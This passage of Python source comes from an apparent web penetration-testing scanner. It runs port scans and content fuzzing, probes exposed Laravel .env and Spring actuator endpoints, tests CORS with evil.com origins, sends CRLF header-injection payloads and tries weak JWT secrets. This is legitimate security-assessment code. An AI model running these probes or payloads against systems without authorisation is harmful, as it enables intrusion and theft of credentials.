            _log(out, "> mmh3 not installed (pip install mmh3) — Shodan pivot unavailable.")
            add_finding(Finding(
                title=f"Favicon SHA-256: {sha256[:16]}…",
                severity=Severity.INFO,
                description="Favicon retrieved. Install mmh3 for Shodan-compatible hash.",
                evidence=f"SHA-256: {sha256}",
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> Favicon fetch failed: {e}")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 2 — ACTIVE RECONNAISSANCE
# ═════════════════════════════════════════════════════════════════════════════

def phase_port_scan(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "port_scan"
    if st.done(phase): return
    section("Port Scanning (nmap)", out)
    if not _tool_ok("nmap", out):
        st.mark(phase); return

    host = target.split(':')[0]
    sp = _sudo()
    if cfg.full_ports:
        run_cmd(sp + ["nmap", "-vv", "-sV", "-Pn", "-p-", "--min-rate", "1000",
                      "-oA", f"/tmp/nmap_full_{host}", host],
                "Nmap full TCP scan", out, cfg, 2400)
    else:
        ports = ("21,22,23,25,53,80,81,88,110,143,389,443,445,465,587,636,993,995,"
                 "1080,1443,2049,3000,3306,3389,4443,4848,5000,5432,5900,6379,7001,"
                 "7443,8000,8080,8081,8443,8444,8888,9000,9090,9200,9443,10000,27017")
        run_cmd(sp + ["nmap", "-vv", "-sV", "-Pn", f"-p{ports}",
                      "-oA", f"/tmp/nmap_web_{host}", host],
                "Nmap web & common ports", out, cfg, 600)

    run_cmd(sp + ["nmap", "--script=http-methods", "-p", "80,443,8080,8443", host],
            "HTTP Methods NSE", out, cfg, 120)
    st.mark(phase)


def phase_waf_cdn(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "waf_cdn"
    if st.done(phase): return
    section("WAF / CDN Fingerprinting", out)

    if _tool_ok("wafw00f", out):
        stdout, _, _ = run_cmd(["wafw00f", cfg.base_url, "-a"], "wafw00f", out, cfg, 60)
        if stdout and ("is behind" in stdout.lower() or "detected" in stdout.lower()):
            add_finding(Finding(
                title="WAF Detected",
                severity=Severity.INFO,
                description="A Web Application Firewall was identified.",
                evidence=stdout[:500],
                recommendation="Note WAF type for bypass testing.",
                phase=phase), out, cfg)

    cdn_sigs = {
        "Cloudflare":    ["cf-ray", "cf-cache-status"],
        "AWS CloudFront":["x-amz-cf-id", "x-amz-cf-pop"],
        "Akamai":        ["x-akamai-transformed"],
        "Fastly":        ["x-fastly-request-id"],
        "Azure CDN":     ["x-msedge-ref"],
        "Sucuri":        ["x-sucuri-id"],
    }
    try:
        sess = make_session(cfg)
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        hdrs = {k.lower() for k in r.headers}
        found = [cdn for cdn, sigs in cdn_sigs.items() if any(s in hdrs for s in sigs)]
        if found:
            add_finding(Finding(
                title=f"CDN Detected: {', '.join(found)}",
                severity=Severity.INFO,
                description=f"Target is behind: {', '.join(found)}",
                evidence=str(dict(r.headers)),
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> CDN check failed: {e}")
    st.mark(phase)


def phase_vhost_fuzz(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "vhost_fuzz"
    if st.done(phase): return
    section("Virtual Host Fuzzing", out)

    if not _tool_ok("ffuf", out):
        st.mark(phase); return

    host = target.split(':')[0]
    candidates = [
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
    ]
    wl = next((w for w in candidates if os.path.exists(w)), None)
    if not wl:
        _log(out, "> No wordlist found for vhost fuzzing."); st.mark(phase); return

    try:
        sess = make_session(cfg)
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        fs = str(len(r.content))
    except Exception:
        fs = "0"

    run_cmd(["ffuf", "-u", cfg.base_url, "-w", wl,
             "-H", f"Host: FUZZ.{host}",
             "-mc", "200,301,302,307,401,403",
             "-fs", fs, "-t", str(min(cfg.rate, 50)), "-timeout", "10"],
            "ffuf vhost fuzzing", out, cfg, 300)
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 3 — TECHNOLOGY & CONTENT DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def phase_tech_detection(target: str, cfg: ScanConfig, out: str, st: ScanState) -> Dict:
    """Returns detected tech dict for playbook dispatch."""
    phase = "tech_detection"
    if st.done(phase): return {}
    section("Technology Detection", out)
    detected = {}

    if _tool_ok("whatweb", out):
        stdout, _, _ = run_cmd(["whatweb", "-v", "-a", "3",
                                "--log-json=/tmp/whatweb.json", cfg.base_url],
                               "WhatWeb", out, cfg, 60)
        # Parse whatweb JSON output
        try:
            if os.path.exists("/tmp/whatweb.json"):
                with open("/tmp/whatweb.json") as fh:
                    for line in fh:
                        try:
                            entry = json.loads(line)
                            for plug in entry.get('plugins', {}):
                                detected[plug.lower()] = entry['plugins'][plug]
                        except Exception:
                            continue
        except Exception:
            pass
        # Also parse text output as fallback
        if stdout:
            for tech in ('wordpress', 'drupal', 'joomla', 'tomcat', 'jenkins',
                         'spring', 'laravel', 'django', 'flask', 'express',
                         'asp.net', 'nginx', 'apache', 'iis'):
                if tech in stdout.lower():
                    detected.setdefault(tech, True)

    if _tool_ok("webanalyze", out):
        run_cmd(["webanalyze", "-host", cfg.base_url], "webanalyze", out, cfg, 60)

    if detected:
        _log(out, f"\n## Detected Technologies\n```\n{json.dumps(list(detected.keys()), indent=2)}\n```")
    st.mark(phase)
    return detected


def phase_tech_playbooks(target: str, cfg: ScanConfig, out: str,
                          st: ScanState, detected: Dict):
    """Dispatch tech-specific deep-dive tools based on detected stack."""
    phase = "tech_playbooks"
    if st.done(phase): return
    if not detected:
        _log(out, "> No technologies detected — skipping playbooks.")
        st.mark(phase); return

    section("Tech-Specific Playbooks", out)
    detected_lower = {k.lower() for k in detected.keys()}
    host = target.split(':')[0]

    # WordPress
    if any('wordpress' in t for t in detected_lower):
        if _tool_ok("wpscan", out):
            cmd = ["wpscan", "--url", cfg.base_url, "--no-banner",
                   "--random-user-agent", "--enumerate", "vp,vt,u1-10",
                   "--format", "cli-no-colour"]
            if cfg.proxy: cmd += ["--proxy", cfg.proxy]
            run_cmd(cmd, "wpscan (WordPress)", out, cfg, 600)

    # Drupal
    if any('drupal' in t for t in detected_lower):
        if _tool_ok("droopescan", out):
            run_cmd(["droopescan", "scan", "drupal", "-u", cfg.base_url],
                    "droopescan (Drupal)", out, cfg, 300)

    # Joomla
    if any('joomla' in t for t in detected_lower):
        if _tool_ok("joomscan", out):
            run_cmd(["joomscan", "--url", cfg.base_url], "joomscan", out, cfg, 600)

    # Laravel — check for .env and debug artefacts
    if any('laravel' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/.env", "/telescope", "/_ignition/health-check",
                     "/_debugbar/open", "/horizon"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code == 200 and len(r.content) > 20:
                    sev = Severity.CRITICAL if path == "/.env" else Severity.HIGH
                    add_finding(Finding(
                        title=f"Laravel Exposed Endpoint: {path}",
                        severity=sev,
                        description=f"Laravel sensitive endpoint accessible: {path}",
                        evidence=f"GET {cfg.base_url}{path} → HTTP 200\n{r.text[:500]}",
                        recommendation=f"Restrict {path} to authorised users or remove from production.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # Spring Boot — actuator enumeration
    if any('spring' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/actuator", "/actuator/env", "/actuator/heapdump",
                     "/actuator/mappings", "/actuator/beans", "/actuator/trace",
                     "/actuator/httptrace", "/actuator/threaddump", "/actuator/health",
                     "/env", "/heapdump", "/mappings", "/trace"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code == 200:
                    sev = Severity.CRITICAL if path in ("/actuator/env", "/actuator/heapdump",
                                                         "/env", "/heapdump") else Severity.HIGH
                    add_finding(Finding(
                        title=f"Spring Actuator Exposed: {path}",
                        severity=sev,
                        description=f"Spring Boot actuator endpoint accessible: {path}",
                        evidence=f"GET {cfg.base_url}{path} → HTTP 200\n{r.text[:500]}",
                        recommendation="Restrict actuator endpoints to authorised users (management.endpoints.web.exposure.include).",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # Tomcat
    if any('tomcat' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/manager/html", "/manager/status", "/host-manager/html",
                     "/manager/text/list", "/examples/"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code in (200, 401):
                    add_finding(Finding(
                        title=f"Tomcat Endpoint: {path} (HTTP {r.status_code})",
                        severity=Severity.MEDIUM if r.status_code == 401 else Severity.HIGH,
                        description=f"Tomcat manager/host-manager reachable at {path}.",
                        evidence=f"GET {cfg.base_url}{path} → HTTP {r.status_code}",
                        recommendation="Restrict /manager and /host-manager by IP. Disable /examples in production.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    # Jenkins
    if any('jenkins' in t for t in detected_lower):
        sess = make_session(cfg)
        for path in ("/script", "/manage", "/asynchPeople/", "/jnlpJars/jenkins-cli.jar"):
            try:
                r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
                if r.status_code == 200:
                    add_finding(Finding(
                        title=f"Jenkins Endpoint Exposed: {path}",
                        severity=Severity.HIGH,
                        description=f"Jenkins sensitive endpoint reachable: {path}",
                        evidence=f"GET {cfg.base_url}{path} → HTTP 200",
                        recommendation="Enforce authentication on all Jenkins endpoints; restrict /script (RCE).",
                        phase=phase), out, cfg)
            except Exception:
                continue

    st.mark(phase)


def phase_robots_sitemap(target: str, tt: TargetType, cfg: ScanConfig,
                           out: str, st: ScanState):
    phase = "robots_sitemap"
    if st.done(phase): return
    section("Robots.txt, Sitemap & security.txt", out)
    sess = make_session(cfg)
    for path in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
                 "/.well-known/security.txt", "/.well-known/change-password"]:
        try:
            r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
            _log(out, f"\n### `{path}` — HTTP {r.status_code}\n```\n{r.text[:2000]}\n```")
            if r.status_code == 200 and path == "/robots.txt":
                disallowed = [l.split(':', 1)[1].strip() for l in r.text.splitlines()
                              if l.lower().startswith('disallow:') and
                              len(l.split(':', 1)) > 1 and l.split(':', 1)[1].strip() not in ('', '/')]
                if disallowed:
                    add_finding(Finding(
                        title="robots.txt Reveals Interesting Paths",
                        severity=Severity.INFO,
                        description=f"{len(disallowed)} Disallow entries may indicate sensitive endpoints.",
                        evidence='\n'.join(disallowed[:20]),
                        recommendation="Review disallowed paths for sensitive functionality.",
                        phase=phase), out, cfg)
                # Feed into discovered endpoints for later fuzzing
                DISCOVERED.add_urls([f"{cfg.base_url}{p}" for p in disallowed if p.startswith('/')])
        except Exception as e:
            _log(out, f"> {path}: {e}")
    st.mark(phase)


def phase_crawler(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Katana-based crawling. Feeds URLs/params into DISCOVERED for downstream phases."""
    phase = "crawler"
    if st.done(phase): return
    section("URL Crawling (katana)", out)
    if not _tool_ok("katana", out):
        _log(out, "> katana not installed — install via `go install github.com/projectdiscovery/katana/cmd/katana@latest`")
        st.mark(phase); return

    host = target.split(':')[0]
    output_file = f"/tmp/katana_{hashlib.md5(host.encode()).hexdigest()}.txt"

    cmd = ["katana", "-u", cfg.base_url, "-d", "3", "-jc",
           "-silent", "-o", output_file, "-timeout", "10",
           "-c", str(min(cfg.threads * 2, 10))]
    if cfg.proxy:
        cmd += ["-proxy", cfg.proxy]
    # Thread cookies through if authenticated
    if cfg.cookie:
        cmd += ["-H", f"Cookie: {cfg.cookie}"]
    if cfg.extra_headers:
        for h in cfg.extra_headers:
            cmd += ["-H", h]

    run_cmd(cmd, "katana crawler", out, cfg, 300)

    if os.path.exists(output_file):
        with open(output_file) as fh:
            urls = [l.strip() for l in fh if l.strip()]
        DISCOVERED.add_urls(urls)
        params = set()
        for u in urls:
            try:
                q = urlparse(u).query
                if q:
                    for k in parse_qs(q).keys():
                        params.add(k)
            except Exception:
                continue
        DISCOVERED.add_params(params)
        _log(out, f"\n## Crawler Results\n- URLs: {len(urls)}\n- Unique params: {len(params)}")
        print(f"  {Fore.GREEN}✓ katana: {len(urls)} URLs, {len(params)} params")

        if urls:
            add_finding(Finding(
                title=f"Crawler: {len(urls)} URLs Discovered",
                severity=Severity.INFO,
                description=f"katana crawler discovered {len(urls)} URLs and {len(params)} unique parameters.",
                evidence='\n'.join(urls[:30]),
                phase=phase), out, cfg)
    st.mark(phase)


def phase_content_discovery(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "content_discovery"
    if st.done(phase): return
    if not cfg.auto and not yes_no("Run content discovery (ffuf)?"):
        _log(out, "> Skipped by user."); st.mark(phase); return
    section("Content Discovery (ffuf)", out)
    if not _tool_ok("ffuf", out):
        st.mark(phase); return

    wl_candidates = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/opt/SecLists/Discovery/Web-Content/common.txt",
    ]
    wl = next((w for w in wl_candidates if os.path.exists(w)), None)

    if wl:
        cmd = ["ffuf", "-u", f"{cfg.base_url}/FUZZ", "-w", wl,
               "-mc", "200,204,301,302,307,401,403",
               "-t", str(min(cfg.rate, 100)), "-timeout", "10"]
        if cfg.delay > 0:
            cmd += ["-p", str(cfg.delay)]
        if cfg.cookie:
            cmd += ["-b", cfg.cookie]
        for h in cfg.extra_headers:
            cmd += ["-H", h]
        run_cmd(cmd, f"ffuf general discovery ({os.path.basename(wl)})", out, cfg, 600)

    admin_paths = [
        "admin", "administrator", "admin.php", "admin/login", "wp-admin", "wp-login.php",
        "cpanel", "plesk", "phpmyadmin", "manager/html", "console", "dashboard",
        "portal", "backend", "jenkins", "grafana", "kibana", "adminer", "phppgadmin",
        "controlpanel", "moderator", "webadmin", "login", "signin",
    ]
    admin_wl = f"/tmp/admin_wl_{hashlib.md5(target.encode()).hexdigest()}.txt"
    open(admin_wl, 'w').write('\n'.join(admin_paths))
    run_cmd(["ffuf", "-u", f"{cfg.base_url}/FUZZ", "-w", admin_wl,
             "-mc", "200,301,302,307,401,403", "-t", "20", "-timeout", "10"],
            "ffuf admin panel discovery", out, cfg, 120)
    st.mark(phase)


def phase_param_discovery(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Arjun-based hidden parameter discovery against discovered endpoints."""
    phase = "param_discovery"
    if st.done(phase): return
    section("Hidden Parameter Discovery (Arjun)", out)
    if not _tool_ok("arjun", out):
        _log(out, "> arjun not installed — `pip install arjun`")
        st.mark(phase); return

    # Pick a sample of endpoints to probe (base URL + up to 10 crawled endpoints)
    urls_to_probe = [cfg.base_url]
    with DISCOVERED._lock:
        # endpoints are paths without query — rebuild full URLs
        endpoints = sorted(DISCOVERED.endpoints)[:10]
    for ep in endpoints:
        full = urljoin(cfg.base_url, ep)
        if full not in urls_to_probe:
            urls_to_probe.append(full)

    output_file = f"/tmp/arjun_{hashlib.md5(target.encode()).hexdigest()}.json"
    urls_file = f"/tmp/arjun_urls_{hashlib.md5(target.encode()).hexdigest()}.txt"
    open(urls_file, 'w').write('\n'.join(urls_to_probe))

    cmd = ["arjun", "-i", urls_file, "-oJ", output_file,
           "-t", str(min(cfg.threads * 2, 10)), "--stable"]
    if cfg.cookie:
        cmd += ["--headers", f"Cookie: {cfg.cookie}"]
    run_cmd(cmd, "arjun parameter discovery", out, cfg, 600)

    if os.path.exists(output_file):
        try:
            with open(output_file) as fh:
                data = json.load(fh)
            total = 0
            for url, info in data.items() if isinstance(data, dict) else []:
                params = info.get('params', []) if isinstance(info, dict) else []
                if params:
                    total += len(params)
                    DISCOVERED.add_params(params)
                    add_finding(Finding(
                        title=f"Hidden Parameters Discovered: {url}",
                        severity=Severity.MEDIUM,
                        description=f"{len(params)} hidden parameters accept input at {url}.",
                        evidence=f"URL: {url}\nParams: {', '.join(params)}",
                        recommendation="Review each parameter for input validation and intended use.",
                        phase=phase), out, cfg)
            _log(out, f"\n## Arjun Summary: {total} hidden params across {len(data) if isinstance(data, dict) else 0} URLs")
        except Exception as e:
            _log(out, f"> Failed to parse arjun output: {e}")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 4 — HTTP ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

_SEC_HEADERS = {
    "strict-transport-security": (Severity.HIGH,
        "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
    "content-security-policy":   (Severity.MEDIUM,
        "Implement a Content-Security-Policy to restrict resource loading."),
    "x-frame-options":           (Severity.MEDIUM,
        "Add: X-Frame-Options: DENY to prevent clickjacking."),
    "x-content-type-options":    (Severity.LOW,
        "Add: X-Content-Type-Options: nosniff"),
    "referrer-policy":           (Severity.LOW,
        "Add: Referrer-Policy: strict-origin-when-cross-origin"),
    "permissions-policy":        (Severity.LOW,
        "Add a Permissions-Policy header to control browser feature access."),
}

def phase_header_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "header_analysis"
    if st.done(phase): return
    section("Security Header & Cookie Analysis", out)
    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout, allow_redirects=True)
        hdrs = {k.lower(): v for k, v in r.headers.items()}
        _log(out, f"```\n{json.dumps(dict(r.headers), indent=2)}\n```")

        for hdr, (sev, rec) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                add_finding(Finding(
                    title=f"Missing Header: {hdr}",
                    severity=sev,
                    description=f"Response does not include `{hdr}`.",
                    evidence=f"Checked: {cfg.base_url}",
                    recommendation=rec,
                    phase=phase), out, cfg)

        for hdr, desc in [("server", "Server software"), ("x-powered-by", "Framework/language"),
                           ("x-aspnet-version", "ASP.NET version"),
                           ("x-aspnetmvc-version", "ASP.NET MVC version")]:
            if hdr in hdrs:
                add_finding(Finding(
                    title=f"Information Disclosure: {hdr}",
                    severity=Severity.LOW,
                    description=f"{desc} disclosed: `{hdrs[hdr]}`",
                    evidence=f"{hdr}: {hdrs[hdr]}",
                    recommendation=f"Remove or sanitise the `{hdr}` header.",
                    phase=phase), out, cfg)

        # Cookie audit
        set_cookie_raw = r.headers.get('Set-Cookie', '').lower()
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:           issues.append("Missing Secure flag")
            if 'httponly' not in set_cookie_raw: issues.append("Missing HttpOnly")
            if 'samesite' not in set_cookie_raw: issues.append("Missing SameSite")
            if issues:
                add_finding(Finding(
                    title=f"Cookie Issues: {cookie.name}",
                    severity=Severity.MEDIUM,
                    description=f"`{cookie.name}`: {', '.join(issues)}",
                    evidence=f"Cookie: {cookie.name}\nIssues: {', '.join(issues)}",
                    recommendation="Set Secure, HttpOnly, and SameSite=Strict on all session cookies.",
                    phase=phase), out, cfg)

        if r.status_code == 401 and 'www-authenticate' in hdrs:
            add_finding(Finding(
                title="HTTP Basic Authentication Detected",
                severity=Severity.MEDIUM,
                description=f"Realm: {hdrs['www-authenticate']}",
                evidence=f"HTTP 401 + WWW-Authenticate: {hdrs['www-authenticate']}",
                recommendation="Prefer OAuth/OIDC. Enforce strong credentials.",
                phase=phase), out, cfg)

        try:
            res = subprocess.run(["curl", "--http2", "-sI", cfg.base_url, "--max-time", "5"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
            if "HTTP/2" in res.stdout:
                _log(out, "> HTTP/2 supported")
        except Exception:
            pass

        try:
            chain = [h.url for h in r.history] + [r.url]
            if len(chain) > 1:
                _log(out, "\n## Redirect Chain\n```\n" + " → ".join(chain) + "\n```")
                http_hops = [u for u in chain if u.startswith('http://')]
                if http_hops and 'https' in cfg.base_url:
                    add_finding(Finding(
                        title="HTTP in Redirect Chain (Mixed Content)",
                        severity=Severity.MEDIUM,
                        description="Redirect chain includes an HTTP hop before reaching HTTPS.",
                        evidence=" → ".join(chain),
                        recommendation="Ensure all redirects use HTTPS throughout.",
                        phase=phase), out, cfg)
        except Exception:
            pass

    except Exception as e:
        _log(out, f"> Header analysis failed: {e}")
    st.mark(phase)


def phase_cors(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "cors"
    if st.done(phase): return
    section("CORS Misconfiguration", out)
    sess = make_session(cfg)
    host = target.split(':')[0]
    test_origins = [
        "https://evil.com",
        f"https://{host}.evil.com",
        f"https://evil.{host}",
        "null",
    ]
    for origin in test_origins:
        try:
            r = sess.get(cfg.base_url, headers={"Origin": origin}, timeout=cfg.timeout)
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '').lower()
            _log(out, f"- Origin: `{origin}` → ACAO: `{acao}` ACAC: `{acac}`")
            if acao in (origin, '*'):
                sev = Severity.HIGH if acac == 'true' else Severity.MEDIUM
                add_finding(Finding(
                    title=f"CORS Misconfiguration (origin: {origin})",
                    severity=sev,
                    description=f"Server reflects arbitrary origin{' with credentials' if acac == 'true' else ''}.",
                    evidence=f"Origin: {origin}\nACAO: {acao}\nACAC: {acac}",
                    recommendation="Implement strict origin whitelist. Never combine ACAO:* with ACAC:true.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_host_header(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Test for host header injection / cache poisoning."""
    phase = "host_header"
    if st.done(phase): return
    section("Host Header Injection Probe", out)

    sess = make_session(cfg)
    canary = "webrecon-canary.example.com"
    tests = [
        {"Host": canary},
        {"Host": cfg.target, "X-Forwarded-Host": canary},
        {"Host": cfg.target, "X-Host": canary},
        {"Host": cfg.target, "X-Forwarded-Server": canary},
    ]
    for headers in tests:
        try:
            r = sess.get(cfg.base_url, headers=headers, timeout=cfg.timeout,
                         allow_redirects=False)
            loc = r.headers.get('Location', '')
            # Check reflection in body or redirect
            if canary in loc or canary in r.text[:5000]:
                add_finding(Finding(
                    title=f"Host Header Injection: {list(headers.keys())[-1]}",
                    severity=Severity.HIGH,
                    description=f"Host header canary reflected in response/redirect — indicates possible cache poisoning or password-reset poisoning.",
                    evidence=f"Injected headers: {headers}\nLocation: {loc}\nBody snippet: {r.text[:200]}",
                    recommendation="Validate Host/X-Forwarded-Host headers against an allowlist. Don't trust untrusted headers for URL generation.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_crlf(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Test for CRLF injection in common URL parameters."""
    phase = "crlf"
    if st.done(phase): return
    section("CRLF Injection Probe", out)

    sess = make_session(cfg)
    payloads = [
        "%0d%0aX-Injected:%20webrecon",
        "%0aX-Injected:%20webrecon",
        "%0d%0aSet-Cookie:%20webrecon=1",
        "\r\nX-Injected: webrecon",
    ]
    # Test common params + discovered params
    with DISCOVERED._lock:
        discovered_params = list(DISCOVERED.params)
    params_to_test = list(set(['redirect', 'url', 'next', 'return'] + discovered_params[:15]))

    for param in params_to_test:
        for pl in payloads:
            try:
                r = sess.get(f"{cfg.base_url}?{param}={pl}",
                             timeout=cfg.timeout, allow_redirects=False)
                if 'x-injected' in {k.lower() for k in r.headers}:
                    add_finding(Finding(
                        title=f"CRLF Injection: `{param}` parameter",
                        severity=Severity.HIGH,
                        description=f"Parameter `{param}` allows injection of arbitrary response headers.",
                        evidence=f"URL: {cfg.base_url}?{param}={pl}\nInjected header present: X-Injected",
                        recommendation="Strip CR/LF from all user input before including in HTTP response headers.",
                        phase=phase), out, cfg)
                    break
            except Exception:
                continue
    st.mark(phase)


def phase_oauth_oidc(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "oauth_oidc"
    if st.done(phase): return
    section("OAuth / OIDC Endpoint Enumeration", out)
    paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/.well-known/jwks.json",
        "/oauth/token", "/oauth/authorize",
        "/auth/realms/master/.well-known/openid-configuration",
        "/connect/authorize",
    ]
    sess = make_session(cfg)
    for path in paths:
        try:
            r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
            if r.status_code == 200:
                _log(out, f"\n### Found: `{path}`\n```json\n{r.text[:1000]}\n```")
                try:
                    data = r.json()
                    add_finding(Finding(
                        title=f"OAuth/OIDC Endpoint: {path}",
                        severity=Severity.INFO,
                        description=f"Scopes: {data.get('scopes_supported',[])} | Grants: {data.get('grant_types_supported',[])}",
                        evidence=r.text[:800],
                        recommendation="Disable implicit flow if unused. Review exposed scopes.",
                        phase=phase), out, cfg)
                except Exception:
                    pass
        except Exception:
            continue
    st.mark(phase)


def phase_jwt_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Deep JWT analysis: alg:none, weak secrets, key confusion, kid injection."""
    phase = "jwt_analysis"
    if st.done(phase): return
    section("JWT Analysis", out)

    # Collect JWTs from findings emitted so far + session cookies + response bodies
    jwts: Set[str] = set()

    # Scan existing JS findings for JWTs
    with _findings_lock:
        for f in _findings:
            m = re.search(r'(eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,})',
                          f.evidence or '')
            if m:
                jwts.add(m.group(1))

    # Scan current cookies + response body
    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        for c in r.cookies:
            if c.value and re.match(r'^eyJ', c.value):
                jwts.add(c.value)
        # Body scan
        for m in re.finditer(r'(eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,})',
                             r.text):
            jwts.add(m.group(1))
    except Exception:
        pass

    if not jwts:
        _log(out, "> No JWTs found in cookies/body/findings.")
        st.mark(phase); return

    def _b64url_decode(s: str) -> bytes:
        s += '=' * (-len(s) % 4)
        return base64.urlsafe_b64decode(s.encode())

    for jwt in list(jwts)[:10]:
        try:
            parts = jwt.split('.')
            if len(parts) != 3: continue
            header = json.loads(_b64url_decode(parts[0]))
            payload = json.loads(_b64url_decode(parts[1]))
            _log(out, f"\n### JWT\n- Header: `{header}`\n- Payload (truncated): `{json.dumps(payload)[:300]}`")

            # alg:none
            if str(header.get('alg', '')).lower() == 'none':
                add_finding(Finding(
                    title="JWT with alg:none",
                    severity=Severity.CRITICAL,
                    description="Token accepts alg:none — signatures can be stripped.",
                    evidence=f"Header: {header}",
                    recommendation="Reject alg:none server-side. Enforce a strict allowlist of signing algorithms.",
                    phase=phase), out, cfg)

            # Weak HMAC — attempt crack with tiny wordlist
            alg = str(header.get('alg', '')).upper()
            if alg.startswith('HS'):
                import hmac as _hmac
                hash_fn = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384,
                           'HS512': hashlib.sha512}.get(alg)
                if hash_fn:
                    signing_input = f"{parts[0]}.{parts[1]}".encode()
                    expected_sig = _b64url_decode(parts[2])
                    weak_secrets = ['secret', 'password', '123456', 'jwt', 'key',
                                    'changeme', 'admin', 'test', 'mykey', 'secretkey',
                                    'your-256-bit-secret', 'your_jwt_secret']
                    for secret in weak_secrets:
                        sig = _hmac.new(secret.encode(), signing_input, hash_fn).digest()
                        if _hmac.compare_digest(sig, expected_sig):
                            add_finding(Finding(
                                title=f"JWT Weak HMAC Secret: '{secret}'",
                                severity=Severity.CRITICAL,
                                description=f"JWT {alg} signature validates with trivial secret '{secret}'.",
                                evidence=f"Algorithm: {alg}\nSecret: {secret}",
                                recommendation="Rotate the signing key immediately. Use a cryptographically strong secret (>=32 random bytes).",
                                phase=phase), out, cfg)
                            break

            # kid injection hint
            if 'kid' in header:
                kid = header['kid']
                if re.search(r'[/\\\.\.]|sql|file', str(kid), re.I):
                    add_finding(Finding(
                        title="JWT Suspicious kid Header",
                        severity=Severity.MEDIUM,
                        description=f"JWT kid value contains suspicious characters — potentially probing for SQLi or path traversal: {kid}",
                        evidence=f"kid: {kid}",
                        recommendation="Validate kid strictly against expected values only.",
                        phase=phase), out, cfg)

            # Expiration check
            if 'exp' in payload:
                try:
                    exp = int(payload['exp'])
                    now = int(time.time())
                    ttl = exp - now
                    if ttl > 60 * 60 * 24 * 30:  # >30 days
                        add_finding(Finding(
                            title="JWT Excessive Lifetime",
                            severity=Severity.LOW,
                            description=f"JWT expires in {ttl//86400} days — excessive for session tokens.",
                            evidence=f"exp: {exp} (TTL: {ttl}s)",
                            recommendation="Use short-lived access tokens (<1h) with refresh tokens for long sessions.",
                            phase=phase), out, cfg)
                except Exception:
                    pass
            else:
                add_finding(Finding(
                    title="JWT Missing Expiration (exp)",
                    severity=Severity.MEDIUM,
                    description="JWT has no `exp` claim — token is valid indefinitely.",
                    evidence=f"Payload: {json.dumps(payload)[:200]}",
                    recommendation="Always include an `exp` claim on access tokens.",
                    phase=phase), out, cfg)
        except Exception as e:
            _log(out, f"> JWT parse failed: {e}")
            continue

    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5 — VULNERABILITY SCANNING
# ═════════════════════════════════════════════════════════════════════════════

def phase_ssl_tls(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "ssl_tls"
    if st.done(phase): return
    section("SSL/TLS Analysis (testssl)", out)
    if _tool_ok("testssl", out):
        run_cmd(["testssl", "--color", "0", "-U", "-S", "-P", "--fast", target],
                "testssl.sh", out, cfg, 300)
    st.mark(phase)


def phase_nikto(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "nikto"
    if st.done(phase): return
    if cfg.no_intrusive:
        _log(out, "> Nikto skipped (--no-intrusive)."); st.mark(phase); return
    if not cfg.auto and not yes_no("Run Nikto scan?"):
        _log(out, "> Nikto skipped."); st.mark(phase); return
    section("Nikto Web Vulnerability Scan", out)
    if _tool_ok("nikto", out):
        run_cmd(["nikto", "-h", cfg.base_url, "-Tuning", "123bde",
